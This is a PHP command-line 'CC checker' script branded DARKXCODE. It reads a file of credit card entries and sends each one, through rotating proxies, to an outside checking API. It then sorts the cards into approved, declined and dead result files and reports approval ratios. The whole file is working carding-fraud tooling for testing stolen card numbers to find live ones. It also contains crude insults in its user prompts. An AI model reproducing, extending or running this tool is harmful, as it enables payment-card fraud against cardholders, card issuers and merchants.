<?php
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : CC CHECKER STRIPE CHARGER
 * VERSION  : BETA VERSION
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */

require_once "function/function.php";
require_once "function/settings.php";
echo banner();
echo banner2();
echo "\n\n$WH [$BL!$WH]$RD Agree with the applicable terms and conditions? $WH($DEF$YL y/n$WH )$GR >> $WH";
$aggg = trim(fgets(STDIN));
if(strtolower($aggg) == "n"){
    exit("\n\n [!] FUCK YOU BITCH [!]\n\n");
}
echo "$WH [$BL!$WH]$RD Note: Do not use a credit card generator.$WH [$BL!$WH] $WH";
echo "\n$WH [$BL!$WH]$RD Note: If there is a BUGs, ​​please contact our Telegram @zlaxtert$WH [$BL!$WH] $WH";
enterlist:
echo "\n\n$WH [$BL+$WH]$BL Enter your list $WH($DEF eg:$YL list.txt$WH )$GR >> $WH";
$listname = trim(fgets(STDIN));
if (empty($listname) || !file_exists($listname)) {
    echo " [!] Your Fucking list not found [!]" . PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));


//============================================> CHECK CARD
$total = count($lists);
$live = 0;
$die = 0;
$dead = 0;
$rto = 0;
$unknown = 0;
$no = 0;

echo "\n\n$WH [$YL!$WH] TOTAL $GR$total$WH CC LISTS [$YL!$WH]$DEF\n\n";
foreach ($lists as $list) {
    $no++;
    // GET SETTINGS

    $Proxies = GetProxy($proxy_list);
    $proxy_Auth = $proxy_pwd;
    $type_proxy = $proxy_type;


    $api = "https://api.darkxcode.site/checker/CC-Demo/?list=$list&proxies=$Proxies&proxyAuth=$proxy_Auth&type_proxy=$type_proxy";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

    $x = curl_exec($ch);
    curl_close($ch);
    $js = json_decode($x, TRUE);
    $codeRes = $js['data']['code'];
    $msg = $js['data']['info']['message'];


    if (strpos($x, '"status": "die"')) {
        $die++;
        save_file("result/checkAgain.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$MG DIE$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, '"status":"die"')) {
        $die++;
        save_file("result/checkAgain.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$MG DIE$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, '"status": "failed"')) {
        $dead++;
        save_file("result/die.txt", "$list|$msg");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DECLINED$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, '"status":"failed"')) {
        $dead++;
        save_file("result/die.txt", "$list|$msg");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DECLINED$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, '"status": "success"')) {
        $live++;
        save_file("result/live.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR APPROVED$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, '"status":"success"')) {
        $live++;
        save_file("result/approved.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR APPROVED$DEF =>$BL $list$DEF | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if ($x == "") {
        $rto++;
        save_file("result/RTO.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$DEF TIMEOUT$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG REQUEST TIMEOUT$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, 'Request Timeout')) {
        $rto++;
        save_file("result/RTO.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$DEF TIMEOUT$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG REQUEST TIMEOUT$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else if (strpos($x, 'Service Unavailable')) {
        $rto++;
        save_file("result/RTO.txt", "$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$DEF TIMEOUT$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG REQUEST TIMEOUT$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    } else {
        $unknown++;
        save_file("result/unknown.txt", "$list");
        //echo $x.PHP_EOL;
        echo "[$RD$no$DEF/$GR$total$DEF]$WH UNKNOWN$DEF =>$BL $list$DEF | [$YL MSG$DEF:$MG UNKNOWN$DEF ] | BY$CY DARKXCODE$DEF (BETA VERSION)" . PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================" . PHP_EOL;
echo " DATE          : " . $date . PHP_EOL;
echo " APPROVE       : " . $live . PHP_EOL;
echo " DECLINED      : " . $dead . PHP_EOL;
echo " RTO           : " . $rto . PHP_EOL;
echo " DIE           : " . $die . PHP_EOL;
echo " UNKNOWN       : " . $unknown . PHP_EOL;
echo " TOTAL         : " . $total . PHP_EOL;
echo "======================================" . PHP_EOL;
echo "[+] RATIO APPROVE  => $GR" . round(RatioCheck($live, $total)) . "%$DEF" . PHP_EOL;
echo "[+] RATIO DECLINED => $RD" . round(RatioCheck($dead, $total)) . "%$DEF" . PHP_EOL . PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' or 'RTO.txt' or 'checkAgain.txt' [!]" . PHP_EOL;
echo "This file '" . $listname . "'" . PHP_EOL;
echo "File saved in folder 'result/' " . PHP_EOL . PHP_EOL;


// ==========> FUNCTION

function collorLine($col)
{
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
?>
